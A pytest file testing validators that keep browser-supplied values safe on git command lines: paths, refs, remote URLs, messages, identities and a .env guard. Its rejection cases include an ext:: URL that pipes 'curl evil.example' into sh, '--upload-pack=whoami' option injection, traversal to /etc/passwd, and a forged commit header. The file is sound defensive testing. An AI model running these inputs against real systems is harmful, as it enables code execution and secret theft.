"""What the browser is allowed to name, and what it is not.

Every value here ends up on a git command line. There is no shell, so
nothing can be "escaped into" a second command -- but git's own command
line is dangerous enough on its own: an argument starting with ``-`` is an
OPTION, and ``--upload-pack=`` runs one. And a path is a second kind of
boundary: the tab reads and writes the OPEN PROJECT, so ``../../.ssh/id_rsa``
has to stop here rather than at the filesystem's permissions.

These are closed grammars, so the tests are written the same way round: a
few things that must pass, and a lot of things that must not.
"""

from __future__ import annotations

import pytest

from app.core.git.errors import GitError
from app.core.git.paths import (
    MAX_PATHS,
    is_env_secret_path,
    validate_branch_name,
    validate_commit_message,
    validate_identity,
    validate_rel_path,
    validate_rel_paths,
    validate_remote_name,
    validate_remote_url,
    validate_sha,
    validate_stash_message,
)


def _refused(call, *args, **kwargs) -> GitError:
    """Run *call* expecting a 400, and hand the error back for its code."""
    with pytest.raises(GitError) as excinfo:
        call(*args, **kwargs)
    assert excinfo.value.status == 400
    return excinfo.value


# --- paths -----------------------------------------------------------------


@pytest.mark.parametrize("path,normalised", [
    ("a.txt", "a.txt"),
    ("src/main.py", "src/main.py"),
    ("./src/main.py", "src/main.py"),
    ("src//main.py", "src/main.py"),
    ("src/", "src"),
    ("my notes/two words.txt", "my notes/two words.txt"),
    # No quoting anywhere in this pipeline (``core.quotepath=false`` plus
    # ``-z``), so a CJK filename is an ordinary filename.
    ("\u8cc7\u6599/\u8a13\u7df4.csv", "\u8cc7\u6599/\u8a13\u7df4.csv"),
])
def test_a_relative_path_comes_back_normalised(tmp_path, path, normalised):
    """One spelling per file: two entries for the same path in one request
    would be two operations on it, and the status output only knows one."""
    assert validate_rel_path(tmp_path, path) == normalised


def test_a_path_need_not_exist(tmp_path):
    """A deleted file is exactly what "discard" and "stage" are for."""
    assert validate_rel_path(tmp_path, "gone/for/good.txt") == "gone/for/good.txt"


@pytest.mark.parametrize("path", [
    pytest.param("", id="empty"),
    pytest.param(".", id="dot"),
    pytest.param("..", id="parent"),
    pytest.param("a/../../b", id="climbs-out"),
    # This one lands back INSIDE the project, so the containment check would
    # pass it. It is refused anyway: git would read it as "b", and nothing
    # would then match it against the path "b" in the status output.
    pytest.param("a/../b", id="climbs-and-comes-back"),
    pytest.param("/etc/passwd", id="absolute"),
    pytest.param("//server/share/x", id="unc"),
    pytest.param("C:/Windows/System32/drivers/etc/hosts", id="drive-letter"),
    # A colon anywhere, not only as a drive letter: on Windows ``ab:c.txt``
    # is the alternate data stream ``c.txt`` of the file ``ab``, which is not
    # the file the path appears to name.
    pytest.param("ab:c.txt", id="alternate-data-stream"),
    pytest.param("sub/a:b", id="colon-in-a-segment"),
    pytest.param("src\\main.py", id="backslash"),
    pytest.param("-rf", id="looks-like-an-option"),
    pytest.param("./-rf", id="looks-like-an-option-after-normalising"),
    pytest.param("--upload-pack=whoami", id="is-an-option"),
    pytest.param("a\x00b", id="nul"),
    pytest.param("a\nb", id="newline"),
])
def test_a_path_that_is_not_one_is_refused(tmp_path, path):
    assert _refused(validate_rel_path, tmp_path, path).code == "invalid_path"


def test_an_absolute_path_inside_the_project_is_still_refused(tmp_path):
    """The containment check cannot catch this one -- the path IS inside the
    root -- so the shape check has to. Same reason as ``a/../b``: git would
    accept the absolute pathspec, and the status output calls it ``a.txt``.

    On Windows this is the drive-letter rule doing the work (``D:/...``) and
    on POSIX the leading-slash one; the request is refused either way.
    """
    (tmp_path / "a.txt").write_text("x", encoding="utf-8")

    error = _refused(validate_rel_path, tmp_path, f"{tmp_path.as_posix()}/a.txt")

    assert error.code == "invalid_path"


def test_a_symlink_out_of_the_project_is_refused(tmp_path):
    """The shape checks cannot see this one: the path has no ``..`` in it and
    is relative. Resolving both sides is what catches it."""
    root = tmp_path / "project"
    root.mkdir()
    outside = tmp_path / "secrets.txt"
    outside.write_text("token", encoding="utf-8")
    try:
        (root / "link.txt").symlink_to(outside)
    except (OSError, NotImplementedError):
        pytest.skip("this platform does not allow creating symlinks here")

    assert _refused(validate_rel_path, root, "link.txt").code == "invalid_path"


def test_a_symlink_inside_the_project_is_fine(tmp_path):
    root = tmp_path / "project"
    (root / "data").mkdir(parents=True)
    (root / "data" / "real.csv").write_text("a,b", encoding="utf-8")
    try:
        (root / "link.csv").symlink_to(root / "data" / "real.csv")
    except (OSError, NotImplementedError):
        pytest.skip("this platform does not allow creating symlinks here")

    assert validate_rel_path(root, "link.csv") == "link.csv"


def test_a_list_of_paths_is_capped(tmp_path):
    """Past a few hundred the user meant "all", which has its own argv."""
    assert len(validate_rel_paths(tmp_path, [f"f{n}.txt" for n in range(MAX_PATHS)])) \
        == MAX_PATHS
    error = _refused(validate_rel_paths, tmp_path,
                     [f"f{n}.txt" for n in range(MAX_PATHS + 1)])
    assert error.code == "invalid_path"


def test_an_empty_list_of_paths_is_refused(tmp_path):
    """``git add -A --`` with no pathspec stages the WHOLE tree, and
    ``clean -f --`` deletes it. "Nothing selected" must never arrive as
    "everything"."""
    assert _refused(validate_rel_paths, tmp_path, []).code == "invalid_path"


def test_one_bad_path_refuses_the_whole_list(tmp_path):
    """Half a staging operation is worse than none."""
    _refused(validate_rel_paths, tmp_path, ["ok.txt", "../etc/passwd"])


# --- refs ------------------------------------------------------------------


@pytest.mark.parametrize("name", ["main", "feat/ok", "release-2.5", "v1.0.x",
                                  "\u4e3b\u8981"])
def test_a_branch_name_is_accepted(name):
    assert validate_branch_name(name) == name


@pytest.mark.parametrize("name", [
    pytest.param("", id="empty"),
    pytest.param("bad name", id="space"),
    pytest.param("-x", id="leading-dash"),
    pytest.param("--upload-pack=whoami", id="is-an-option"),
    pytest.param("@origin", id="leading-at"),
    # ``main@{1}`` is a perfectly valid ref -- the reflog of main -- which
    # makes it exactly the wrong thing to accept as a branch NAME.
    pytest.param("a@{1}", id="reflog-syntax"),
    pytest.param("a\tb", id="tab"),
    pytest.param("a\x01b", id="control"),
    pytest.param("x" * 256, id="far-too-long"),
])
def test_a_branch_name_that_is_not_one_is_refused(name):
    assert _refused(validate_branch_name, name).code == "invalid_ref"


@pytest.mark.parametrize("name", ["origin", "upstream", "fork-2", "a.b_c"])
def test_a_remote_name_is_accepted(name):
    assert validate_remote_name(name) == name


@pytest.mark.parametrize("name", ["", "-x", "a b", ".hidden", "a/b", "x" * 65])
def test_a_remote_name_that_is_not_one_is_refused(name):
    assert _refused(validate_remote_name, name).code == "invalid_value"


@pytest.mark.parametrize("sha,canonical", [
    ("deadbee", "deadbee"),
    ("0" * 40, "0" * 40),
    # A paste out of a UI that shows upper-case hex is still a commit id.
    ("DEADBEEF", "deadbeef"),
    ("  deadbee\n", "deadbee"),
])
def test_a_commit_id_is_accepted(sha, canonical):
    assert validate_sha(sha) == canonical


@pytest.mark.parametrize("sha", ["", "dead", "z" * 7, "0" * 41, "HEAD",
                                 "dead beef"])
def test_a_commit_id_that_is_not_one_is_refused(sha):
    assert _refused(validate_sha, sha).code == "invalid_ref"


# --- URLs ------------------------------------------------------------------


@pytest.mark.parametrize("url", [
    "https://github.com/owner/repo.git",
    "ssh://git@github.com/owner/repo.git",
    "file:///srv/mirrors/repo.git",
    "git@github.com:owner/repo.git",
])
def test_a_remote_url_is_accepted(url):
    assert validate_remote_url(url) == url


@pytest.mark.parametrize("url", [
    # ``ext::`` is not a location, it is a command line git runs.
    pytest.param("ext::sh -c 'curl evil.example/$0|sh'", id="ext-transport"),
    pytest.param("fd::7", id="fd-transport"),
    pytest.param("-upload-pack=whoami", id="leading-dash"),
    pytest.param("http://github.com/owner/repo.git", id="plaintext-http"),
    pytest.param("git://github.com/owner/repo.git", id="git-protocol"),
    pytest.param("https://github.com/owner/re po.git", id="inner-space"),
    pytest.param(" https://github.com/owner/repo.git", id="leading-space"),
    pytest.param("https://github.com/owner/repo.git\n", id="trailing-newline"),
    pytest.param("", id="empty"),
    pytest.param("/srv/mirrors/repo.git", id="bare-path"),
])
def test_a_remote_url_that_is_not_allowed_is_refused(url):
    assert _refused(validate_remote_url, url).code == "invalid_url"


# --- messages and identity -------------------------------------------------


def test_a_commit_message_keeps_its_body():
    """Subject, blank line, body -- the one multi-line value here."""
    assert validate_commit_message("  feat: add a node\n\nWhy: because\n  ") \
        == "feat: add a node\n\nWhy: because"


@pytest.mark.parametrize("message", ["", "   \n  ", "x" * 10_001, "a\x00b"])
def test_a_commit_message_that_is_not_usable_is_refused(message):
    assert _refused(validate_commit_message, message).code == "invalid_value"


def test_a_commit_message_may_be_long():
    assert len(validate_commit_message("x" * 10_000)) == 10_000


def test_a_stash_message_is_one_line():
    assert validate_stash_message("  wip: the loss curve  ") == "wip: the loss curve"


@pytest.mark.parametrize("message", ["", "   ", "two\nlines", "x" * 501])
def test_a_stash_message_that_is_not_one_line_is_refused(message):
    assert _refused(validate_stash_message, message).code == "invalid_value"


def test_an_identity_is_stripped_and_optional():
    assert validate_identity("  Ada Lovelace ", "ada@example.com") == \
        ("Ada Lovelace", "ada@example.com")
    assert validate_identity(name="Ada") == ("Ada", None)
    assert validate_identity() == (None, None)


@pytest.mark.parametrize("name,email", [
    pytest.param("", None, id="blank-name"),
    pytest.param("  ", None, id="whitespace-name"),
    pytest.param("-Ada", None, id="name-starts-with-a-dash"),
    # A newline in a name would forge a second header line in the commit
    # object git writes.
    pytest.param("Ada\nCommitter: Eve <eve@example.com>", None, id="newline-name"),
    pytest.param("x" * 256, None, id="name-too-long"),
    pytest.param(None, "not-an-email", id="email-without-at"),
    pytest.param(None, "-a@example.com", id="email-starts-with-a-dash"),
    pytest.param(None, "a@example.com\nx", id="newline-email"),
    pytest.param(None, "", id="blank-email"),
])
def test_an_identity_that_is_not_one_is_refused(name, email):
    assert _refused(validate_identity, name, email).code == "invalid_value"


# --- the .env guard --------------------------------------------------------


@pytest.mark.parametrize("path", [
    ".env",
    ".env.local",
    ".env.production",
    "sub/.env",
    "a/b/.env.local",
    # Windows and macOS filesystems are case-insensitive: ``.ENV`` is the
    # same file, and a guard that only knew the lowercase spelling would
    # hand it over.
    ".ENV",
])
def test_a_dotenv_file_is_a_secret(path):
    assert is_env_secret_path(path) is True


@pytest.mark.parametrize("path", [
    ".env.example",
    "sub/.env.example",
    "env.txt",
    "environment.yml",
    ".environment",
    "src/main.py",
])
def test_everything_else_is_not(path):
    assert is_env_secret_path(path) is False
